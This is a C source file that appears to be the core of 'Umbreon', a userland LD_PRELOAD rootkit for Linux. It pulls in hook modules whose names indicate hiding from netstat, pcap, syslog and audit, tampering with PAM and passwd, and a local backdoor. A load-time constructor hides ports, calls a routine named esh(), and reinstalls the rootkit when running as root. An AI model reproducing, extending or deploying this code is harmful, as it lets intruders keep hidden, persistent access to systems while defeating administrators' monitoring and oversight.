/*
Most of the function hooks now have their own files.
Much easier to deal with that way, as opposed to having it all here.
*/
#define _GNU_SOURCE

//.h includes
#include "config.h"
#include "includes.h"
#include "umbreon.h"
#include "getprocname.h"
#include "dlsym.c"
#include "misc.h"
#include "getpath.h"
//.c includes
#include "audit.c"
#include "access.c"
#include "chown.c"
#include "dirs.c"
#include "exec.c"
#include "links.c"
#include "local-door.c"
#include "kill.c"
#include "maps.c"
#include "netstat.c"
#include "readwrite.c"
#include "rename.c"
#include "setgid.c"
#include "stat.c"
#include "socket.c"
#include "syslog.c"
#include "pcap.c"
#include "unhide-funcs.c"
#ifdef HAVE_PAM
#include "pam_vprompt.c"
#include "pam.c"
#endif // HAVE_PAM
#include "passwd.c"
#include "procstatus.c"
#include "open.c"


void __attribute ((constructor)) init (void) {
  libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if(!real_dlsym) find_dlsym();
  get_hideports();
  esh();
  if(!geteuid()) reinstall_self();
}
